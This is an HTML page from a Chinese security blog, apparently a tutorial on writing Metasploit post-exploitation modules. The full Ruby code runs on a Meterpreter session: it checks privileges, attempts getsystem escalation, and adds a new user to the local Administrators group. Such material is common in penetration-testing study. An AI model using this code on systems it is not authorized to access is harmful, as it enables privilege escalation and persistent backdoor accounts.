@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="只因不值得">
+  <meta name="keywords" content="">
+  <title>MSF模块编写初学 - 只因不值得</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>只因不值得</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">分类</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    3.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      14 分钟
+                  </span>
+                
+
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+              <p
+                class="note note-warning">本文最后更新于：2021 , 四月 24日 星期六, 8:53 早上</p>
+            
+            <div class="markdown-body">
+              <h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>学习文章：(文章99%的代码来自下列学习文章中)</p>
+<blockquote>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652475687&idx=1&sn=fa25e7129f9734a577ae2e88caa8a446&chksm=f2583294c52fbb82a1848cb6ebd58537ec0bfe6c09861605265f609804d0ea252a7e40550bf9&scene=178&cur_album_id=1420713294159265793#rd" target="_blank" rel="noopener">雷神众测 - 打造Metasploit</a></p>
+<p><a href="https://www.cnblogs.com/Kali-Team/p/12589630.html" target="_blank" rel="noopener">三米前有蕉皮 - Metasploit后渗透模块开发</a></p>
+</blockquote>
+<p>官方文档：</p>
+<blockquote>
+<p><a href="https://github.com/rapid7/metasploit-framework/blob" target="_blank" rel="noopener">Github源码</a></p>
+<p><a href="https://github.com/rapid7/metasploit-framework/wiki/How-to-get-started-with-writing-a-post-module" target="_blank" rel="noopener">metasploit Post Wiki</a></p>
+</blockquote>
+<p>刚开始看，就挑简单的先写，因为msf使用的函数，需要自己在源码中查看，wiki也有一部分，但是没写全</p>
+<p>不要问我为啥不看，问就是懒，没救了</p>
+<h1 id="0x01-基础格式讲解"><a href="#0x01-基础格式讲解" class="headerlink" title="0x01 基础格式讲解"></a>0x01 基础格式讲解</h1><pre><code class="ruby">require &#39;msf/core&#39;
+
+class MetasploitModule &lt; Msf::Post
+
+    def initialize(info={})
+        super(update_info(info,
+        &#39;Name&#39;          =&gt; &#39;[Platform] [Module Category] [Software] [Function]&#39;,
+        &#39;Description&#39;   =&gt; %q{
+          Say something that the user might want to know.
+        },
+        &#39;License&#39;       =&gt; MSF_LICENSE,
+        &#39;Author&#39;        =&gt; [ &#39;Name&#39; ],
+        &#39;Platform&#39;      =&gt; [ &#39;win&#39;, &#39;linux&#39;, &#39;osx&#39;, &#39;unix&#39;, &#39;bsd&#39; ],
+        &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39;, &#39;shell&#39; ]
+        ))
+    end
+end</code></pre>
+<p>在MSF中编写模块，无论是编写exploit、Auxiliary、Post或其他模块，都需要导入MSF的核心库<code>require &#39;msf/core&#39;</code></p>
+<p>MSF中规定模块的编写必须在<code>MetasploitModule</code>类中进行编写，类名是固定的！</p>
+<p>类名后的<code>&lt; Msf::Post</code>表示该类继承自MSF核心库中的Post，继承核心库的哪个大模块，根据个人决定</p>
+<blockquote>
+<p>Ps: Ruby不支持多继承，但是Ruby支持mixin来实现</p>
+</blockquote>
+<p><code>initialize</code>构造函数中的<code>super</code>函数写的是该模块的详细信息</p>
+<blockquote>
+<p>Name: 名称</p>
+<p>Description：描述</p>
+<p>Author：作者</p>
+<p>License：许可</p>
+<p>Platform：支持的平台</p>
+<p>SessionTypes：meterpreter支持的session或shell</p>
+</blockquote>
+<h1 id="0x02-检查当前获取的权限"><a href="#0x02-检查当前获取的权限" class="headerlink" title="0x02 检查当前获取的权限"></a>0x02 检查当前获取的权限</h1><pre><code class="ruby">require &#39;msf/core&#39;
+
+class MetasploitModule &lt; Msf::Post
+    include Msf::Post::Windows::Priv
+
+    def initialize(info={})
+        super(update_info(
+            info,
+            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,
+            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},
+            &#39;License&#39; =&gt; MSF_LICENSE,
+            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,
+            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ], # 表示仅支持win平台
+            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控
+        ))
+    end
+end</code></pre>
+<p><code>include Msf::Post::Windows::Priv</code>：表示包含MSF核心库下的Post模块中windows的Priv文件</p>
+<blockquote>
+<p>这样做，可以在类中直接使用该文件的函数</p>
+<p>Ps: 在Ruby函数调用无参函数时，可以不加括号！！！</p>
+</blockquote>
+<p>文件路径是：<code>/lib/msf/core/post/windows/priv.rb</code></p>
+<p>让代码运行起来，在Post模块下几乎是编写在<code>run()</code>中的，同样是写在MetasploitModule类中</p>
+<pre><code class="ruby">def run
+    print_status(&quot;检查Session会话权限&quot;)
+    admin_check = is_admin?
+    if(admin_check)
+        print_good(&quot;Current User is Admin&quot;)
+    else
+        print_error(&quot;Cuttent User is Not Admin&quot;)
+    end
+
+    # 检查操作系统版本
+    win_ver = sysinfo[&quot;OS&quot;]
+    print_good(&quot;Target Os: #{win_ver}&quot;)
+end</code></pre>
+<p>MSF中的控制台输出语句：（只列举该文中使用的）</p>
+<p>1、<code>print_error(str)</code>：失败打印，红色</p>
+<p>2、<code>print_good(str)</code>：成功打印，绿色</p>
+<p>3、<code>print_status(str)</code>：状态打印，蓝色</p>
+<p><code>is_admin</code>是一个函数，用来检查当前会话的权限，成功返回true，失败fasle</p>
+<blockquote>
+<p><code>is_admin</code>函数来自于：<code>Msf::Post::Windows::Priv</code>，如果不进行包含，则无法进行使用</p>
+</blockquote>
+<h1 id="0x03-MSF导入并使用"><a href="#0x03-MSF导入并使用" class="headerlink" title="0x03 MSF导入并使用"></a>0x03 MSF导入并使用</h1><ul>
+<li>在msf打开的情况下，导入自己使用的模块</li>
+</ul>
+<blockquote>
+<p>把自己写的脚本放入对应的模块中，例如：我这里写的是Post的模块，就放入到Post模块下的windows</p>
+<p>文件名：session_test.rb</p>
+</blockquote>
+<p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/0.png" srcset="/img/loading.gif" alt=""></p>
+<p>然后在msf中使用<code>reload_all</code>重新加载全部模块</p>
+<p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/1.png" srcset="/img/loading.gif" alt=""></p>
+<ul>
+<li>没打开msf的情况下，导入自己的模块</li>
+</ul>
+<blockquote>
+<p>直接把自己写的脚本放入到对应模块中，然后启用msfconsole使用即可</p>
+</blockquote>
+<p><strong>导入不成功采坑记录：</strong></p>
+<p>1、你的语法有错误，导致了无法成功导入</p>
+<p>2、命名问题</p>
+<blockquote>
+<p>如果还是不行，建议查看MSF的错误日志：<code>/root/.msf4/logs/framework.log</code></p>
+<p>查找错误对应的错误，然后下面有写错误原因</p>
+</blockquote>
+<p>效果查看:</p>
+<p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/2.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="0x04-添加自带提权"><a href="#0x04-添加自带提权" class="headerlink" title="0x04 添加自带提权"></a>0x04 添加自带提权</h1><p>如果当前会话是低权限时，自动尝试获取高权限，然后添加一个选项表示可以手动关闭</p>
+<ul>
+<li>先编写提权函数</li>
+</ul>
+<pre><code class="ruby">def getsystem
+    results = session.priv.getsystem # 进行getsystem提权
+
+    if results[0]
+        return true # 提权成功
+    else
+        return false # 提权失败
+    end
+end</code></pre>
+<ul>
+<li>添加选项：使用<code>register_options()</code>进行注册选项</li>
+</ul>
+<blockquote>
+<p>在构造函数initialize中进行注册，可以注册多个基本数据进行存储</p>
+</blockquote>
+<p>注册选项就是在msf中使用<code>show options</code>显示的选项<br><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/3.png" srcset="/img/loading.gif" alt=""></p>
+<blockquote>
+<p>Name：名称</p>
+<p>Current Setting：当前设置</p>
+<p>Required：参数是否为必填项，false / true</p>
+<p>Description: 描述</p>
+</blockquote>
+<pre><code class="ruby">register_options([
+    OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false])
+    ])</code></pre>
+<blockquote>
+<p>说明：OptBool.new(Name,[Required,Description,Current Setting]),把里面的参数对应上面的说明</p>
+</blockquote>
+<p>直接贴完整的代码：对Run的修改也在其中</p>
+<pre><code class="ruby">require &#39;msf/core&#39;
+
+class MetasploitModule &lt; Msf::Post
+    include Msf::Post::Windows::Priv
+    def initialize(info={})
+        super(update_info(
+            info,
+            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,
+            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},
+            &#39;License&#39; =&gt; MSF_LICENSE,
+            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,
+            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ],
+            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控
+        ))
+
+        register_options([
+            OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false])
+        ])
+    end
+
+    # 尝试进行提权
+    def getsystem
+        results = session.priv.getsystem # 进行getsystem提权
+
+        if results[0]
+            return true # 提权成功
+        else
+            return false # 提权失败
+        end
+    end
+
+    def adminuser_check
+        admin_check = is_admin?
+        if(admin_check)
+            print_good(&quot;Current User is Admin&quot;)
+        else
+            print_error(&quot;Cuttent User is Not Admin&quot;)
+        end
+    end
+
+
+    # 程序 Run
+    def run
+        print_status(&quot;检查Session会话权限&quot;)
+        adminuser_check
+
+        # 检查操作系统版本
+        win_ver = sysinfo[&quot;OS&quot;]
+        print_good(&quot;Target Os: #{win_ver}&quot;)
+
+        # 判断是否需要提权
+        # print_status(&quot;正在尝试提权ing&quot;)
+        if !is_system? # 判断是不是系统权限
+            if datastore[&#39;GetSystem&#39;] # 查看默认注册选项，是不是开启的
+                print_status(&quot;正在尝试提权ing&quot;)
+                if getsystem
+                    print_good(&quot;获取权限成功&quot;)
+                else
+                    print_error(&quot;获取权限失败&quot;)
+                end
+            end
+        else
+            print_good(&quot;当前权限为System&quot;)
+        end
+    end
+end</code></pre>
+<p><code>datastore</code>变量中存储的是所有注册选项的值</p>
+<p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/4.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="0x05-添加用户"><a href="#0x05-添加用户" class="headerlink" title="0x05 添加用户"></a>0x05 添加用户</h1><ul>
+<li>注册三个选项：用户和密码及是否添加用户</li>
+</ul>
+<pre><code class="ruby">register_options([
+    OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false]),
+    OptBool.new(&#39;Add_user&#39;,[false,&#39;是否添加用户&#39;]),
+    OptString.new(&#39;UserName&#39;,[false,&#39;用户名&#39;,]),
+    OptString.new(&#39;PassWord&#39;,[false,&#39;密码&#39;,])
+])</code></pre>
+<p>在进行添加用户之前，我们需要注意的是该系统中是否该相同的用户！</p>
+<ul>
+<li>枚举当前系统的用户</li>
+</ul>
+<pre><code class="ruby"># 查询当前系统是否包含该用户
+def check_user(user)
+    enum_user.include?(user)
+end</code></pre>
+<p><code>enum_user</code>：枚举用户</p>
+<ul>
+<li>添加用户模块</li>
+</ul>
+<pre><code class="ruby">def adduser
+    if datastore[&#39;PassWord&#39;].nil? # 判断密码是否创建
+        # 创建随机8位密码
+        datastore[&#39;PassWord&#39;] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)
+        print_status(&quot;你没有设置密码，默认密码：#{datastore[&#39;PassWord&#39;]}&quot;)
+    end
+
+    # 添加用户
+    if check_user(datastore[&#39;UserName&#39;])
+        print_error(&quot;当前用户已有该用户：#{datastore[&#39;UserName&#39;]}&quot;)
+        return
+    else
+        result = add_user(datastore[&#39;UserName&#39;],datastore[&#39;PassWord&#39;]) # 添加用户
+        if result[&#39;return&#39;] == 0
+            print_good(&quot;添加用户：#{datastore[&#39;UserName&#39;]} : #{datastore[&#39;PassWord&#39;]}&quot;)
+        else
+            print_error(&quot;添加用户失败&quot;)
+        end
+    end
+end</code></pre>
+<p><code>datastore[&#39;PassWord&#39;] = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)</code></p>
+<p>当用户没有设置密码的时候，我们创建一个8位的随机密码给用户</p>
+<blockquote>
+<p><code>rand_text_alphanumeric</code>：生成随机字母字符</p>
+<p><code>rand_text_numeric</code>：生成随机数字字符</p>
+</blockquote>
+<p>这两个函数位于：<code>/lib/msf/core/exploit.rb</code>中</p>
+<p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/5.png" srcset="/img/loading.gif" alt=""></p>
+<p><code>add_user(用户，密码)</code>：添加用户的函数</p>
+<blockquote>
+<p>文件位置：<code>/lib/msf/core/post/windows/accounts.rb</code></p>
+</blockquote>
+<ul>
+<li>完整代码和使用效果</li>
+</ul>
+<pre><code class="ruby">require &#39;msf/core&#39;
+
+class MetasploitModule &lt; Msf::Post
+    include Msf::Post::Windows::Priv
+    def initialize(info={})
+        super(update_info(
+            info,
+            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,
+            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},
+            &#39;License&#39; =&gt; MSF_LICENSE,
+            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,
+            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ],
+            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控
+        ))
+
+        register_options([
+            OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false]),
+            OptBool.new(&#39;Add_user&#39;,[false,&#39;是否添加用户&#39;]),
+            OptString.new(&#39;UserName&#39;,[false,&#39;用户名&#39;,]),
+            OptString.new(&#39;PassWord&#39;,[false,&#39;密码&#39;,])
+        ])
+    end
+
+    # 尝试进行提权
+    def getsystem
+        results = session.priv.getsystem # 进行getsystem提权
+
+        if results[0]
+            return true # 提权成功
+        else
+            return false # 提权失败
+        end
+    end
+
+    def adminuser_check
+        admin_check = is_admin?
+        if(admin_check)
+            print_good(&quot;Current User is Admin&quot;)
+        else
+            print_error(&quot;Cuttent User is Not Admin&quot;)
+        end
+    end
+
+    # 查询当前系统是否包含该用户
+    def check_user(user)
+        enum_user.include?(user)
+    end
+
+    # 添加用户
+    def adduser(username,password)
+        if password.nil? # 判断密码是否创建
+            # 创建随机8位密码
+            password = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)
+            print_status(&quot;你没有设置密码，默认密码：#{password}&quot;)
+        end
+
+        # 添加用户
+        if check_user(username)
+            print_error(&quot;当前用户已有该用户：#{username}&quot;)
+            return
+        else
+            result = add_user(username,password) # 添加用户
+            if result[&#39;return&#39;] == 0
+                print_good(&quot;添加用户：#{username} : #{password}&quot;)
+            else
+                print_error(&quot;添加用户失败&quot;)
+            end
+        end
+    end
+
+    # 程序 Run
+    def run
+        print_status(&quot;检查Session会话权限&quot;)
+        adminuser_check
+
+        # 检查操作系统版本
+        win_ver = sysinfo[&quot;OS&quot;]
+        print_good(&quot;Target Os: #{win_ver}&quot;)
+
+        # 判断是否需要提权
+        # print_status(&quot;正在尝试提权ing&quot;)
+        if !is_system? # 判断是不是系统权限
+            if datastore[&#39;GetSystem&#39;] # 查看默认注册选项，是不是开启的
+                print_status(&quot;正在尝试提权ing&quot;)
+                if getsystem
+                    print_good(&quot;获取权限成功&quot;)
+                else
+                    print_error(&quot;获取权限失败&quot;)
+                end
+            end
+        else
+            print_good(&quot;当前权限为System&quot;)
+        end
+
+        # 添加用户
+        if datastore[&#39;Add_user&#39;]
+            adduser(datastore[&#39;UserName&#39;],datastore[&#39;PassWord&#39;])
+        end
+    end
+end</code></pre>
+<p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/6.png" srcset="/img/loading.gif" alt=""></p>
+<h1 id="0x06-添加到本地用户组"><a href="#0x06-添加到本地用户组" class="headerlink" title="0x06 添加到本地用户组"></a>0x06 添加到本地用户组</h1><p>这里就不用注册什么选项了，毕竟一般添加用户名都是直接添加到管理员组一步到位！直接改脚本即可</p>
+<ul>
+<li>修改adduser函数</li>
+</ul>
+<pre><code class="ruby"># 添加用户
+def adduser(username,password)
+    if password.nil? # 判断密码是否创建
+    # 创建随机8位密码
+        password = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)
+        print_status(&quot;你没有设置密码，默认密码：#{password}&quot;)
+    end
+
+    admin_sid = resolve_sid(&quot;S-1-5-32-544&quot;) # 处理sid
+
+    if !admin_sid[:mapped]
+        print_error(&quot;Administrators group is not mapped&quot;) if !admin_sid[:mapped] # 没有映射Administrators组
+        print_error(&quot;Not adding user #{username}&quot;) # 没有添加用户
+        return
+    end
+
+    admin = admin_sid[:name] # 本地组名
+
+    # 添加用户
+    if check_user(username)
+        print_error(&quot;当前用户已有该用户：#{username}&quot;)
+        return
+    else
+        result = add_user(username,password) # 添加用户
+        if result[&#39;return&#39;] == 0
+            print_good(&quot;添加用户：#{username} : #{password}&quot;)
+            add_members_localgroup(admin,username)
+            print_good(&quot;添加到管理员组成功！&quot;)
+        else
+            print_error(&quot;添加失败&quot;)
+        end
+    end
+end</code></pre>
+<p><code>resolve_sid(SID)</code>：检查指定的SID帐户</p>
+<p><code>add_members_localgroup(localgroup, username)</code>：添加进管理员组</p>
+<blockquote>
+<p>文件路径：<code>/lib/msf/core/post/windows/accounts.rb</code></p>
+</blockquote>
+<ul>
+<li>完整代码</li>
+</ul>
+<pre><code class="ruby">require &#39;msf/core&#39;
+
+class MetasploitModule &lt; Msf::Post
+    include Msf::Post::Windows::Priv
+    def initialize(info={})
+        super(update_info(
+            info,
+            &#39;Name&#39; =&gt; &#39;Check Permissions&#39;,
+            &#39;Description&#39; =&gt; %{查看会话权限及添加用户名到本地组},
+            &#39;License&#39; =&gt; MSF_LICENSE,
+            &#39;Author&#39; =&gt; &#39;AnonySec@DropLab&#39;,
+            &#39;Platform&#39;      =&gt; [ &#39;win&#39; ],
+            &#39;SessionTypes&#39;  =&gt; [ &#39;meterpreter&#39; ] # 表明该模块可以在session上进行操控
+        ))
+
+        register_options([
+            OptBool.new(&#39;GetSystem&#39;,[true,&#39;获取目标System权限.&#39;,false]),
+            OptBool.new(&#39;Add_user&#39;,[false,&#39;是否添加用户&#39;]),
+            OptString.new(&#39;UserName&#39;,[false,&#39;用户名&#39;,]),
+            OptString.new(&#39;PassWord&#39;,[false,&#39;密码&#39;,])
+        ])
+    end
+
+    # 尝试进行提权
+    def getsystem
+        results = session.priv.getsystem # 进行getsystem提权
+
+        if results[0]
+            return true # 提权成功
+        else
+            return false # 提权失败
+        end
+    end
+
+    def adminuser_check
+        admin_check = is_admin?
+        if(admin_check)
+            print_good(&quot;Current User is Admin&quot;)
+        else
+            print_error(&quot;Cuttent User is Not Admin&quot;)
+        end
+    end
+
+    # 查询当前系统是否包含该用户
+    def check_user(user)
+        enum_user.include?(user)
+    end
+
+    # 添加用户
+    def adduser(username,password)
+        if password.nil? # 判断密码是否创建
+            # 创建随机8位密码
+            password = Rex::Text.rand_text_alphanumeric(6) + Rex::Text.rand_text_numeric(2)
+            print_status(&quot;你没有设置密码，默认密码：#{password}&quot;)
+        end
+
+        admin_sid = resolve_sid(&quot;S-1-5-32-544&quot;) # 处理sid
+
+        if !admin_sid[:mapped]
+            print_error(&quot;Administrators group is not mapped&quot;) if !admin_sid[:mapped] # 没有映射Administrators组
+            print_error(&quot;Not adding user #{username}&quot;) # 没有添加用户
+            return
+        end
+
+        admin = admin_sid[:name]
+
+        # 添加用户
+        if check_user(username)
+            print_error(&quot;当前用户已有该用户：#{username}&quot;)
+            return
+        else
+            result = add_user(username,password) # 添加用户
+            if result[&#39;return&#39;] == 0
+                print_good(&quot;添加用户：#{username} : #{password}&quot;)
+                add_members_localgroup(admin,username)
+                print_good(&quot;添加到管理员组成功！&quot;)
+            else
+                print_error(&quot;添加失败&quot;)
+            end
+        end
+    end
+
+    # 程序 Run
+    def run
+        print_status(&quot;检查Session会话权限&quot;)
+        adminuser_check
+
+        # 检查操作系统版本
+        win_ver = sysinfo[&quot;OS&quot;]
+        print_good(&quot;Target Os: #{win_ver}&quot;)
+
+        # 判断是否需要提权
+        # print_status(&quot;正在尝试提权ing&quot;)
+        if !is_system? # 判断是不是系统权限
+            if datastore[&#39;GetSystem&#39;] # 查看默认注册选项，是不是开启的
+                print_status(&quot;正在尝试提权ing&quot;)
+                if getsystem
+                    print_good(&quot;获取权限成功&quot;)
+                else
+                    print_error(&quot;获取权限失败&quot;)
+                end
+            end
+        else
+            print_good(&quot;当前权限为System&quot;)
+        end
+
+        # 添加用户
+        if datastore[&#39;Add_user&#39;]
+            adduser(datastore[&#39;UserName&#39;],datastore[&#39;PassWord&#39;])
+        end
+    end
+end</code></pre>
+<p><img src="/images/%E9%9A%8F%E6%89%8B%E8%AE%B0/msf%E6%A8%A1%E5%9D%97%E5%88%9D%E5%B0%9D%E8%AF%95/7.png" srcset="/img/loading.gif" alt=""></p>
+<ul>
+<li>总结：</li>
+</ul>
+<blockquote>
+<p>使用MSF编写模块，大部分情况下使用MSF自带的函数就可以完成</p>
+<p>唯一让人头疼的就是，模块有点多，需要你自己查看函数的定义</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <p>
+                
+                  <span>
+                <i class="iconfont icon-inbox"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E9%9A%8F%E6%89%8B%E8%AE%B0/">随手记</a>
+                      &nbsp;
+                    
+                  </span>&nbsp;&nbsp;
+                
+                
+                  <span>
+                <i class="iconfont icon-tag"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Linux/">Linux</a>
+                    
+                  </span>
+                
+              </p>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" target="_blank" rel="nofollow noopener noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <div class="post-prev col-12 col-md-6">
+                    
+                  </div>
+                  <div class="post-next col-12 col-md-6">
+                    
+                      <a href="/2021/02/01/%E6%BC%8F%E6%B4%9E/CVE-2021-3156/">
+                        <span>CVE-2021-3156 Sudo提权漏洞复现</span>
+                        <i class="fa fa-chevron-right"></i>
+                      </a>
+                    
+                  </div>
+                </div>
+              
+            </div>
+
+              
+          </div>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc-start"></div>
+<div id="toc">
+  <p class="h5"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+  <div id="tocbot"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+  
+
+  
+
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <div>
+      <a rel="nofollow noopener"><b>2018</b></a>
+      <i class="fab fa-angular"></i>
+      <a rel="nofollow noopener"> <b>只因不值得</b></a>
+    </div>
+    
+
+    
+
+    
+  </div>
+</footer>
+
+<!-- SCRIPTS -->
+<script  src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/popper.js/1.16.1/umd/popper.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/js/bootstrap.min.js" ></script>
+<script  src="https://cdn.staticfile.org/mdbootstrap/4.13.0/js/mdb.min.js" ></script>
+<script  src="/js/main.js" ></script>
+
+
+  <script  src="/js/lazyload.js" ></script>
+
+
+
+  
+  <script  src="https://cdn.staticfile.org/tocbot/4.10.0/tocbot.min.js" ></script>
+  <script>
+    $(document).ready(function () {
+      var navHeight = $('#navbar').height();
+      var toc = $('#toc');
+      var boardCtn = $('#board-ctn');
+      var boardTop = boardCtn.offset().top;
+      var tocLimMax = 2 * boardTop + boardCtn.height();
+
+      $(window).scroll(function () {
+        var tocLimMin = $('#toc-start').offset().top - navHeight;
+        var scroH = document.body.scrollTop + document.documentElement.scrollTop;
+
+        if (tocLimMin <= scroH && scroH <= tocLimMax) {
+          toc.css({
+            'display': 'block',
+            'position': 'fixed',
+            'top': navHeight,
+          });
+        } else if (scroH <= tocLimMin) {
+          toc.css({
+            'position': '',
+            'top': '',
+          });
+        } else if (scroH > tocLimMax) {
+          toc.css('display', 'none');
+        }
+      });
